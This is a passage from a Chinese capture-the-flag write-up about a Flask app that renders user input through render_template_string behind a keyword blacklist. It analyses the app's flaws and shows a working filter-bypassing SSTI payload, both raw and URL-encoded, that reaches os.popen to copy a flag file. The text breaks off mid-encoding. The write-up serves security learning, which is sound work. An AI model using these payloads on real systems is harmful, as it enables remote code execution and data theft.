class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPProxyHandler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target_host = target_host</span><br><span class="line">        <span class="variable language_">self</span>.target_port = target_port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">self, client_socket</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = client_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                request_data += chunk</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request_data:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> proxy_socket:</span><br><span class="line">                proxy_socket.connect((<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port))</span><br><span class="line">                proxy_socket.sendall(request_data)</span><br><span class="line"></span><br><span class="line">                response_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = proxy_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    response_data += chunk</span><br><span class="line"></span><br><span class="line">            header_end = response_data.rfind(<span class="string">b&quot;\r\n\r\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> header_end != -<span class="number">1</span>:</span><br><span class="line">                body = response_data[header_end + <span class="number">4</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                body = response_data</span><br><span class="line">                </span><br><span class="line">            response_body = body</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)).encode() + <span class="string">b&quot;\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;\r\n&quot;</span> + response_body</span><br><span class="line"></span><br><span class="line">            client_socket.sendall(response)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Proxy Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_proxy_server</span>(<span class="params">host, port, target_host, target_port</span>):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Proxy server is running on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> and forwarding to <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;target_port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span><br><span class="line">            thread.daemon = <span class="literal">True</span></span><br><span class="line">            thread.start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Shutting down proxy server...&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy_host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    proxy_port = <span class="number">5001</span></span><br><span class="line">    target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    target_port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全反代，防止针对响应头的攻击</span></span><br><span class="line">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span><br><span class="line">    proxy_thread.daemon = <span class="literal">True</span></span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Flask app...&quot;</span>)</span><br><span class="line">    run_flask_app()</span><br></pre></td></tr></table></figure><h3 id="（一）概要分析"><a href="#（一）概要分析" class="headerlink" title="（一）概要分析"></a>（一）概要分析</h3><p>这段代码结合了 Flask Web 应用和一个 HTTP 代理服务器。<br>它创建了一个简单的 Web 应用，通过 Flask 提供了两个路由，一个用来展示代码源文件的内容，另一个用来渲染用户提交的模板代码。<br>此外，还实现了一个基本的 HTTP 代理功能，可以将客户端的请求转发到目标服务器，并处理响应。<br>代码运行在两个线程中：一个用于 Flask Web 应用，另一个用于代理服务器。</p><h3 id="（二）-Flask-应用分析"><a href="#（二）-Flask-应用分析" class="headerlink" title="（二） Flask 应用分析"></a>（二） Flask 应用分析</h3><ol><li><p><strong>Flask 路由</strong>：</p><ul><li><strong><code>GET /</code></strong>：<ul><li>打开当前脚本文件并返回其内容，使用 <code>html.escape</code> 进行 HTML 转义，以防止 XSS（跨站脚本攻击）。</li></ul></li><li><strong><code>POST /</code></strong>：<ul><li>从表单获取 <code>code</code> 参数，这个参数包含了用户提供的模板代码。</li><li>进行简单的安全过滤：检查代码中是否包含一些可能危险的字符串，如 <code>__</code>、<code>import</code>、<code>os</code> 等。若发现这些危险字符，会返回 <code>&quot;Forbidden content detected!&quot;</code>。</li><li>如果代码通过过滤，则使用 <code>render_template_string</code> 渲染这个模板并返回结果。如果渲染成功，则返回 <code>ok</code>；如果渲染失败，则返回 <code>error</code>。</li></ul></li></ul></li><li><p><strong>安全过滤问题</strong>：</p><ul><li>目前的安全过滤逻辑过于简单，只检查了 <code>code</code> 中是否包含一些危险的关键字。这样的方法可能不够完善，因为攻击者可以通过各种方式绕过这些简单的字符串检查（例如通过混淆字符、编码绕过等）。</li><li>更有效的做法是使用更精细的代码审计和沙箱环境来确保用户提供的模板代码不会执行恶意操作。</li></ul></li></ol><h3 id="（三）-HTTP-代理服务器分析"><a href="#（三）-HTTP-代理服务器分析" class="headerlink" title="（三） HTTP 代理服务器分析"></a>（三） HTTP 代理服务器分析</h3><ol><li><p><strong><code>HTTPProxyHandler</code> 类</strong>：</p><ul><li>该类用于处理客户端请求，将请求转发到目标服务器，并将目标服务器的响应返回给客户端。</li><li>它使用 <code>socket</code> 库进行网络通信。客户端请求数据通过 <code>recv()</code> 接收并转发到目标服务器，然后接收目标服务器的响应并转发给客户端。</li></ul></li><li><p><strong><code>start_proxy_server</code> 函数</strong>：</p><ul><li>启动一个代理服务器，监听指定的端口，并处理多个客户端连接。</li><li>每当一个客户端连接时，创建一个新的线程处理该请求，确保支持并发。</li></ul></li><li><p><strong><code>安全反代</code></strong>：</p><ul><li>代理服务器通过将请求转发到目标服务器（Flask 应用）来处理响应。这有助于防止一些针对 Flask 应用的攻击（例如某些针对 HTTP 头部的攻击），但它依赖于正确的实现和配置。代理服务器的简单实现并没有加入更多的安全措施，如请求过滤或身份验证等。</li></ul></li></ol><h3 id="（四）代码安全性分析"><a href="#（四）代码安全性分析" class="headerlink" title="（四）代码安全性分析"></a>（四）代码安全性分析</h3><ol><li><p><strong>SSTI (Server-Side Template Injection)</strong>：</p><ul><li>Flask 使用了 <code>render_template_string</code> 来渲染用户提供的模板代码，潜在的风险是 <strong>SSTI</strong> 漏洞。恶意用户可以提交恶意模板代码，导致执行任意代码（例如文件读取、命令执行等）。</li><li>对用户输入的过滤机制（检查 <code>import</code>、<code>os</code> 等）是基础的，但不足以防范复杂的模板注入攻击。攻击者可能通过混淆技术绕过这些检查。</li><li>如果用户提交的模板代码没有被正确过滤，攻击者可以注入并执行恶意的 Python 代码。</li></ul></li><li><p><strong>代理服务器的潜在问题</strong>：</p><ul><li>虽然代理服务器能够隐藏原始 Flask 应用的详细信息，但其实现存在一些安全风险：<ul><li><strong>没有处理 HTTPS</strong>：如果客户端和代理服务器之间使用 HTTP 明文传输，可能会暴露敏感数据（如身份验证信息）。</li><li><strong>没有进行请求验证</strong>：代理服务器将请求转发到目标服务器而不进行任何安全检查，攻击者可以利用它绕过一些服务器端的防护措施。</li><li><strong>缺乏完整的错误处理和日志</strong>：代理服务器没有针对连接错误、目标服务器错误或数据包注入进行完整的错误处理，这可能导致服务中断或安全漏洞。</li></ul></li></ul></li><li><p><strong>可能的攻击场景</strong>：</p><ul><li><strong>SSTI 攻击</strong>：攻击者提交恶意模板代码，通过 <code>render_template_string</code> 执行不安全的操作，如访问文件、执行系统命令等。</li><li><strong>代理滥用</strong>：攻击者可以利用代理服务器访问目标服务器的内部服务，绕过防火墙等安全机制。</li><li><strong>服务拒绝攻击</strong>：由于代理服务器将所有流量转发到目标服务器，可能会成为服务拒绝攻击的目标，特别是没有对请求做限制的情况下。</li></ul></li></ol><h3 id="（三）-思路分析"><a href="#（三）-思路分析" class="headerlink" title="（三） 思路分析"></a>（三） 思路分析</h3><ol><li>请求方式</li></ol><ul><li><p>使用get访问会读取当前的python脚本的内容 并返回源码</p></li><li><p>使用post方法会获取code的内容 黑名单进行过滤 然后渲染模板</p></li></ul><ol start="2"><li>绕过过滤</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;n&#x27;</span>]</span><br></pre></td></tr></table></figure><p>需要传递的参数为code，内容都在code的键中</p><p>当前是无回显的ssti</p><p>我们要进行<em><strong>无回显的绕过构造</strong></em></p><p>我们可以使用hackbar&#x2F;fenjing来自动构造payload</p><ol start="3"><li>我们有黑名单 我们可以本地起一个ssti</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():    </span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:        </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():    </span><br><span class="line">   template_code = request.form.get(<span class="string">&quot;code&quot;</span>)    <span class="comment"># 安全过滤    </span></span><br><span class="line">   blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;n&#x27;</span>]    </span><br><span class="line">   <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:        </span><br><span class="line">      <span class="keyword">if</span> black <span class="keyword">in</span> template_code:            </span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span>    </span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">         result = render_template_string(template_code)</span><br><span class="line">         <span class="keyword">return</span> result  <span class="comment"># 直接返回渲染后的模板内容    </span></span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>  <span class="comment"># 返回错误信息</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPProxyHandler</span>:    </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):        </span><br><span class="line">      <span class="variable language_">self</span>.target_host = target_host        </span><br><span class="line">      <span class="variable language_">self</span>.target_port = target_port    </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">self, client_socket</span>):        </span><br><span class="line">      <span class="keyword">try</span>:           </span><br><span class="line">         request_data = <span class="string">b&quot;&quot;</span>            </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:                </span><br><span class="line">            chunk = client_socket.recv(<span class="number">4096</span>)                </span><br><span class="line">            request_data += chunk                </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">4096</span>:                    </span><br><span class="line">               <span class="keyword">break</span>            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request_data:                </span><br><span class="line">               client_socket.close()                </span><br><span class="line">               <span class="keyword">return</span>            </span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> proxy_socket:</span><br><span class="line">               proxy_socket.connect((<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port))                proxy_socket.sendall(request_data)                </span><br><span class="line">               response_data = <span class="string">b&quot;&quot;</span>                </span><br><span class="line">               <span class="keyword">while</span> <span class="literal">True</span>:                    </span><br><span class="line">                  chunk = proxy_socket.recv(<span class="number">4096</span>)                    </span><br><span class="line">                  <span class="keyword">if</span> <span class="keyword">not</span> chunk:                        </span><br><span class="line">                     <span class="keyword">break</span>                    </span><br><span class="line">                  response_data += chunk            </span><br><span class="line">            header_end = response_data.rfind(<span class="string">b&quot;rnrn&quot;</span>)            </span><br><span class="line">            <span class="keyword">if</span> header_end != -<span class="number">1</span>:                </span><br><span class="line">               body = response_data[header_end + <span class="number">4</span>:]            </span><br><span class="line">            <span class="keyword">else</span>:                </span><br><span class="line">               body = response_data                            </span><br><span class="line">               response_body = body            </span><br><span class="line">               response = <span class="string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)).encode() + <span class="string">b&quot;\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;\r\n&quot;</span> + response_body</span><br><span class="line">               client_socket.sendall(response)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">f&quot;Proxy Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_proxy_server</span>(<span class="params">host, port, target_host, target_port</span>):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Proxy server is running on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> and forwarding to <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;target_port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span><br><span class="line">            thread.daemon = <span class="literal">True</span></span><br><span class="line">            thread.start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Shutting down proxy server...&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy_host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    proxy_port = <span class="number">5001</span></span><br><span class="line">    target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    target_port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全反代，防止针对响应头的攻击</span></span><br><span class="line">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span><br><span class="line">    proxy_thread.daemon = <span class="literal">True</span></span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Flask app...&quot;</span>)</span><br><span class="line">    run_flask_app()</span><br></pre></td></tr></table></figure><ol start="4"><li>本地运行</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\app.py</span><br></pre></td></tr></table></figure><p>显示:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">starting Flask APP:</span><br><span class="line">* Serving Flask app &#x27;app&#x27;</span><br><span class="line">* Debug mode: off</span><br><span class="line">Proxy server is running on 0.0.0.0:50001 and forwarding to 127.0.0.1:5000...</span><br><span class="line">* Running on http://127.0.0.1:5000</span><br></pre></td></tr></table></figure><ol start="5"><li>得到payload</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提交表单完成，返回值为200，</span><br><span class="line">输入为&#123;&#x27;code&#x27;: &quot;&#123;%set gl = &#x27;_&#x27;*2 + &#x27;globals&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set bu = &#x27;_&#x27;*2 + &#x27;builtins&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set im = &#x27;_&#x27;*2 + &#x27;i&#x27;&#x27;mport&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set ax = &#x27;so&#x27;[::-1]%&#125;&quot;</span><br><span class="line">&quot;&#123;&#123;cycler.next[gl][bu][im](ax)[&#x27;P&#x27;&#x27;open&#x27;](&#x27;cat /flag &gt; app.py&#x27;).read()&#125;&#125;&quot;&#125;，</span><br><span class="line">表单为&#123;&#x27;action&#x27;: &#x27;/&#x27;, &#x27;method&#x27;: &#x27;POST&#x27;, &#x27;inputs&#x27;: &#123;&#x27;code&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>对payload进行URL编码并作为参数传递</li></ol><ul><li>原payload</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;%set gl = &#x27;_&#x27;*2 + &#x27;globals&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set bu = &#x27;_&#x27;*2 + &#x27;builtins&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set im = &#x27;_&#x27;*2 + &#x27;i&#x27;&#x27;mport&#x27; + &#x27;_&#x27;*2%&#125;&quot;</span><br><span class="line">&quot;&#123;%set ax = &#x27;so&#x27;[::-1]%&#125;&quot;</span><br><span class="line">&quot;&#123;&#123;cycler.next[gl][bu][im](ax)[&#x27;P&#x27;&#x27;open&#x27;](&#x27;cat /flag &gt; app.py&#x27;).read()&#125;&#125;&quot;</span><br></pre></td></tr></table></figure><ul><li>进行URL编码后的payload</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%22%7B%25set%20gl%20%3D%20%27_%27*2%20%2B%20%27globals%27%20%2B%20%27_%27*2%25%7D%22</span><br><span class="line">%22%7B%25set%20bu%20%3D%20%27_%27*2%20%2B%20%27builtins%27%20%2B%20%27_%27*2%25%7D%22</span><br><span class="line">%22%7B%25set%20im%20%3D%20%27_%27*2%20%2B%20%27i%27%27mport%27%20%2B%20%27_%27*2%25%7D%22</span><br><span 